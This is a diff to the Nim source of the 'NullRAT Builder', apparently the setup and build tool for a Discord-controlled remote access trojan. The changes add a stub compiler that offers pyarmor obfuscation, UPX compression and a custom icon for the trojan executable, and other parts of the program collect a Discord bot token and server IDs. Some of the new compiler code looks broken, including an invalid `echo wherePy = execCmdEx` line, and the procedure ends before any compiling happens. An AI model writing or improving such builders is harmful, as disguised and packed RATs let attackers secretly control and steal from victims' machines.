@@ -7,6 +7,7 @@ import std/[strutils, strformat]
 proc cls() = 
     discard execShellCmd("cls")
 
+discard execShellCmd("title NullRAT Builder");
 discard execShellCmd("chcp 65001");
 cls()
 discard execShellCmd("mode con: cols=80 lines=29");
@@ -30,27 +31,20 @@ proc cleanWorkingDir() =
                 inp = getch()
                 if inp == 'Y' or inp == 'y':
                     moveFile(absolutePath("NullRAT" / "Variables.py"), dirrr / "NullRAT2" / "Variables.py")
-                    break
-                else:
-                    break
         removeDir("NullRAT")
         moveDir(dirrr / "NullRAT2", dirrr / "NullRAT")
     removeFile("AIO.bat")
     removeFile("AIO_Legacy.bat")
         
     # remove git stuff if downloaded from source
-    var inpu: char
-    while inpu != 'Y' or inpu != 'y' or inpu != 'N' or inpu != 'n':
-        echo "Remove git files? (y/N)"
-        inpu = getch()
-        if inpu == 'y' or inpu == 'Y':
-            removeDir(".git")
-            removeFile("README.md")
-            removeFile("Getting Variables.md")
-            removeFile(".gitignore")
-            break
-        else:
-            break
+    echo "Remove git files? (y/N)"
+    var inpu: char = getch()
+    if inpu == 'y' or inpu == 'Y':
+        removeDir(".git")
+        removeFile("README.md")
+        removeFile("Getting Variables.md")
+        removeFile(".gitignore")
+
     removeFile("RAT.exe")
     removeDir("build")
     removeDir("dist")        
@@ -58,6 +52,7 @@ proc cleanWorkingDir() =
     cls()
     
 proc printName() = 
+    cls()
     echo ""
     stdout.styledWriteLine(fgRed, "  ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗")
     stdout.styledWriteLine(fgRed, "  ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝")
@@ -68,13 +63,59 @@ proc printName() =
     stdout.styledWriteLine(fgRed, "  =========================================================")
     echo ""
 
-proc compiler() = 
-    cls()
+proc compiler(): int = 
     printName()
-    discard getch()
+    var dirr = getAppDir()
+    setCurrentDir(dirr / "NullRAT")
+    echo ""
+    
+    stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
+    echo ""
+    var obfuscate: bool
+    var compress: bool
+    var icon: bool
+    
+    stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
+    var input: char = getch()
+    if input == 'N' or input == 'n': obfuscate = false
+    else: obfuscate = true
+    
+    stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
+    input = getch()
+    if input == 'N' or input == 'n': compress = false
+    else: compress = true
+    
+    stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
+    input = getch()
+    var iconPath: string
+    if input == 'Y' or input == 'y': 
+        icon = true
+        echo "Enter custom icon (.ico file) path:"
+        iconPath = readLine(stdin);
+    else: icon = false
+
+    printName()
+    echo ""
+    echo "All options selected: "
+    echo "---------------------"
+    if obfuscate: echo "Executable will be obfuscated (w/ pyarmor)"
+    if compress: echo "Executable will be compressed (w/ upx)"
+    if icon: 
+        echo "Executable will have custom icon."
+        echo "Path: ", iconPath
+    echo ""
+    stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
+    input = getch()
+    if input == 'N' or input == 'n':
+        echo "- Information marked incorrect! Aborting..."
+        sleep(1000)
+        return 0
+    else:
+        stdout.styledWriteLine(fgCyan, "- Compiling using selected settings...") 
+        stdout.styledWriteLine(fgCyan, "- Checking pyinstaller")
+        echo wherePy = execCmdEx("where pyinstaller")
     
 proc variablesCreator() = 
-    cls()
     printName()
     var dirr = getAppDir()
     setCurrentDir(dirr / "NullRAT")
@@ -91,12 +132,12 @@ proc variablesCreator() =
         if input == 'N' or input == 'n':
             echo "- Information marked incorrect! Continuing..."
             sleep(1000)
-            cls()
             printName()
         else:
             echo "- Information marked correct. Preserving..."
             sleep(1000)
-            compiler()
+            if compiler() == 0:
+                return 
 
     echo "-----------\nTo know how to obtain the variables,\nCheck 'Getting Variables.md' in NullRAT Github\n-----------"
     stdout.styledWriteLine({styleBright}, "\n[1] Please enter the Discord bot token: ")
@@ -113,7 +154,6 @@ proc variablesCreator() =
         "server_ids = [" & serverID & "]"
     ]
     
-    cls()
     printName()
     stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
     echo ""
@@ -141,10 +181,10 @@ proc variablesCreator() =
         echo ""
         stdout.styledWriteLine({styleBright}, "Moving on to compiler...")
         sleep(3000)
-        compiler()
+        if compiler() == 0:
+            return
             
 proc packageInstaller() = 
-    cls()
     printName()
     stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
     echo ""
@@ -178,7 +218,7 @@ proc packageInstaller() =
                     variablesCreator()
 
     else:
-        stdout.styledWriteLine({styleBright}, "-nPython not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
+        stdout.styledWriteLine({styleBright}, "- Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
         var input: char = getch();
         if input == 'N' or input == 'n':
             echo "NullRAT Builder cannot continue otherwise!!! Exiting..."
@@ -191,7 +231,7 @@ proc packageInstaller() =
             stdout.styledWriteLine({styleBright}, "Since we do not support automatic installation of python,")
             stdout.styledWriteLine({styleBright}, "you have to run the installer manually.")
             stdout.styledWriteLine({styleBright}, "After running, please tick 'Install for All Users'")
-            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then install it")
+            stdout.styledWriteLine({styleBright}, "and 'Add Python 3.8 to PATH', then Install Now")
             stdout.styledWriteLine({styleBright}, "After installing, check if everything is functional")
             stdout.styledWriteLine({styleBright}, "by running NullRAT builder again.")
             echo ""
@@ -200,7 +240,6 @@ proc packageInstaller() =
             return
     
 proc mainMenu() =
-    cls()
     printName();
     stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
     echo ""
